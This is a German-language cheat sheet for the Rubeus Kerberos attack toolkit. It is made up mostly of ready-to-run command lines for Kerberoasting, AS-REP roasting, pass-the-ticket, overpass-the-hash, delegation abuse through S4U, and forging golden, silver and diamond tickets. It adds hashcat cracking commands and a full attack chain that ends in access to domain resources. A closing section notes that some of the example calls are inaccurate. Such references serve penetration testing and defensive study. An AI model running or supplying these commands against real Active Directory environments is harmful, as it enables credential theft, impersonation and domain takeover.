# 🎫 Rubeus – Werkzeugsammlung für Kerberos-Prüfungen

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Kerberos-Interaktion und Angriffsprüfung
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Rubeus?](#-was-ist-rubeus)
- [Ticket-Operationen](#-ticket-operationen)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Angriffe mit Tickets](#-angriffe-mit-tickets)
- [Delegierung ausnutzen](#-delegierung-ausnutzen)
- [Golden und Silver Tickets](#-golden-und-silver-tickets)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist Rubeus?

**Rubeus** ist eine C#-Werkzeugsammlung zur Interaktion mit Kerberos und zur Prüfung seiner Angriffsmöglichkeiten. Ein TGT ist ein Ticket zur Anforderung weiterer Tickets; ein Dienstticket wird für einen bestimmten Dienst verwendet. Rubeus bietet:

- 🎫 **Ticket-Operationen** – Tickets anfordern, erneuern und beschreiben
- 🔓 **Kerberoasting** – Prüfdaten aus Diensttickets gewinnen
- 🔑 **AS-REP Roasting** – Konten ohne erforderliche Kerberos-Vorauthentifizierung prüfen
- 🎭 **Pass-the-Ticket** – Entwendete Tickets wiederverwenden
- ✨ **Golden/Silver Tickets** – Tickets fälschen

---

## 🚀 Grundlegende Verwendung

### Rubeus starten

```powershell
# Direkt ausführen
.\Rubeus.exe <command> [options]

# Im Speicher ausführen (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Über PowerShell laden
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a name="-ticket-operationen"></a>

## 🎟️ Ticket-Operationen

### TGT anfordern

```powershell
# Mit Passwort
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Mit NTLM-Hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Mit AES256-Schlüssel
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Mit Zertifikat
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Ausgabe in eine Datei schreiben
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### TGS anfordern

```powershell
# Dienstticket anfordern
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Mit TGT aus einer Datei
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Tickets auflisten

```powershell
# Tickets des aktuellen Benutzers auflisten
.\Rubeus.exe triage

# Alle Tickets auflisten (Administratorrechte erforderlich)
.\Rubeus.exe triage /luid:0x3e7

# Detaillierte Ticketdaten auslesen
.\Rubeus.exe dump
```

### Pass-the-Ticket

```powershell
# Ticket in die aktuelle Sitzung importieren
.\Rubeus.exe ptt /ticket:base64ticket

# Aus einer Datei importieren
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Neue Anmeldesitzung erstellen und importieren
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Ticket beschreiben

```powershell
# Ticketdetails anzeigen
.\Rubeus.exe describe /ticket:base64ticket

# Aus einer Datei
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

## 🍖 Kerberoasting

### Einfaches Kerberoasting

```powershell
# Kerberoasting für alle SPNs
.\Rubeus.exe kerberoast

# In eine Datei schreiben (Hashcat-Format)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Einen bestimmten Benutzer auswählen
.\Rubeus.exe kerberoast /user:sqlservice

# RC4-Downgrade (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

### Erweitertes Kerberoasting

```powershell
# Mit einem bestimmten TGT
.\Rubeus.exe kerberoast /ticket:base64tgt

# Nur Statistik (keine Tickets)
.\Rubeus.exe kerberoast /stats

# Einen bestimmten SPN auswählen
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# AES-Verschlüsselung (unauffälliger)
.\Rubeus.exe kerberoast /aes

# Nach Benutzer filtern
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Kerberoast-Hashes knacken

```bash
# Hashcat (Modus 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

## 🔓 AS-REP Roasting

### Einfaches AS-REP Roasting

```powershell
# Benutzer ohne Vorauthentifizierung finden und AS-REP-Daten erfassen
.\Rubeus.exe asreproast

# Ausgabe in eine Datei schreiben
.\Rubeus.exe asreproast /outfile:asrep.txt

# Einen bestimmten Benutzer auswählen
.\Rubeus.exe asreproast /user:targetuser

# Hashcat-Format
.\Rubeus.exe asreproast /format:hashcat
```

### AS-REP-Hashes knacken

```bash
# Hashcat (Modus 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 🎭 Angriffe mit Tickets

### Overpass-the-Hash (Pass-the-Key)

```powershell
# TGT mit Hash anfordern und neue Sitzung erstellen
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Mit AES-Schlüssel
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Separaten Prozess für die Sitzung erstellen
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

```powershell
# S4U2Self – Benutzer gegenüber dem eigenen Dienst vertreten
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy – Benutzer gegenüber einem anderen Dienst vertreten
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Vollständige Kette
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🔀 Delegierung ausnutzen

### Unconstrained Delegation (uneingeschränkte Delegierung)

```powershell
# TGTs auf einem Host mit uneingeschränkter Delegierung beobachten
.\Rubeus.exe monitor /interval:5 /nowrap

# Bestimmter Filter
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# TGTs sammeln
.\Rubeus.exe harvest /interval:30
```

### Constrained Delegation (eingeschränkte Delegierung)

```powershell
# Ticket für einen zugelassenen Dienst anfordern
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Resource-Based Constrained Delegation (RBCD)

```powershell
# Nach der RBCD-Konfiguration mit PowerMad/PowerView
# Ticket im Kontext des Angreifer-Computerkontos anfordern
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## ✨ Golden und Silver Tickets

### Golden Ticket

```powershell
# Golden Ticket erstellen (krbtgt-Hash erforderlich)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Gruppen angeben
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Mit AES-Schlüssel
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

```powershell
# Silver Ticket erstellen (Hash des Dienstkontos erforderlich)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# LDAP-Dienst (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

```powershell
# Verändertes legitimes TGT
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

## 📊 Schnellübersicht

### Wichtige Befehle

| Befehl | Beschreibung |
| --------- | ------------- |
| `asktgt` | TGT anfordern |
| `asktgs` | TGS anfordern |
| `kerberoast` | Prüfdaten aus Diensttickets gewinnen |
| `asreproast` | AS-REP Roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | Service for User |
| `golden` | Golden Ticket fälschen |
| `silver` | Silver Ticket fälschen |
| `dump` | Alle Ticketdaten auslesen |
| `triage` | Tickets auflisten |

### Authentifizierungsoptionen

| Option | Beschreibung |
| -------- | ------------- |
| `/user:` | Benutzername |
| `/password:` | Passwort |
| `/rc4:` | NTLM-Hash |
| `/aes256:` | AES256-Schlüssel |
| `/ticket:` | Base64-Ticket |

### Häufige Optionen

| Option | Beschreibung |
| -------- | ------------- |
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | Ausgabe in eine Datei schreiben |
| `/nowrap` | Base64 ohne Zeilenumbrüche ausgeben |
| `/domain:` | Zieldomäne |
| `/dc:` | Domänencontroller |

### Angriffsablauf

```powershell
# 1. Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Hashes knacken
hashcat -m 13100 kerb.txt rockyou.txt

# 3. TGT mit dem ermittelten Passwort anfordern
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Alternativ Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Auf Ressourcen zugreifen
dir \\server\share
```

---

## 📚 Ressourcen

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Verwandte Cheatsheets
- [BloodHound](../../BloodHound/translations/README.de.md)
- [Impacket](../../Impacket/translations/README.de.md)
- [Mimikatz](../../Mimikatz/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Aufruf und Sitzungen:** LoadFile lädt die Assembly, ruft aber nicht automatisch deren Einstiegspunkt auf. Die Kontexte Cobalt Strike und PowerShell sind verschieden. [Microsoft: Assembly.LoadFile](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile). Die LUID bezeichnet eine Anmeldesitzung: 0x3e7 wählt die SYSTEM-Sitzung, nicht alle Sitzungen. ptt importiert standardmäßig in den aktuellen Kontext; es erzeugt nicht selbst eine neue Sitzung. ticket akzeptiert je nach Aufruf Base64 oder eine kirbi-Datei. Rechte und Ticketgültigkeit bleiben entscheidend. [Rubeus: Ticketverwaltung und Extraktion](https://github.com/GhostPack/Rubeus#ticket-management).
- **Roasting und Formate:** rc4opsec filtert nach Konten ohne AES-Unterstützung und verwendet tgtdeleg; es ist keine pauschale Herabstufung jedes AES-Kontos. AES oder ein Opsec-Schalter garantieren keine unbemerkte Ausführung. AS-REP Roasting setzt passende Kontoeinstellungen voraus. [Rubeus: Roasting](https://github.com/GhostPack/Rubeus#roasting). Die Hashcat-Modi 13100 und 18200 passen zu etype 23, nicht zu allen Kerberos-Formaten. [Hashcat: Formate](https://hashcat.net/wiki/doku.php?id=example_hashes).
- **Delegierung und Dienste:** S4U2Self und S4U2Proxy sind unterschiedliche Schritte; die ersten als Einzelstufen beschrifteten Aufrufe können bereits eine Kette anstoßen. Delegierungsattribute, Kontorechte, Ziel-SPN und Umgebung müssen passen. Auch ein LDAP-Silver-Ticket ist allein keine Zusage für DCSync; dafür sind passende Replikationsrechte erforderlich. [BloodHound: DCSync-Rechte](https://bloodhound.specterops.io/resources/edges/dc-sync). Die Übersicht beschreibt Möglichkeiten, keinen garantierten Weg zum Domänenadministrator. [Rubeus: S4U](https://github.com/GhostPack/Rubeus#constrained-delegation-abuse).
- **Ticketfälschung und Versionen:** Die Golden-Beispiele verwenden krbtgt als Optionsnamen; der geprüfte Rubeus-Parser erwartet stattdessen einen unterstützten Schlüsselparameter. Der Diamond-Aufruf zeigt nur einen Ausschnitt: Für die Ticketänderung fehlt der benötigte krbtgt-Schlüssel. AES wird im geprüften Diamond-Parser als AES256-Alias akzeptiert. Alle ursprünglichen Aufrufe bleiben unverändert; Schlüssel, PAC-Validierung und Version müssen zum konkreten Fall passen. [Rubeus: Golden-Parser](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Golden.cs), [Diamond-Parser](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Diamond.cs).

---

<p align="center">
  <b>🎫 Kerberos verstehen und prüfen!</b><br>
  <i>Rubeus – Kerberos-Tickets und Domänenrechte untersuchen</i>
</p>
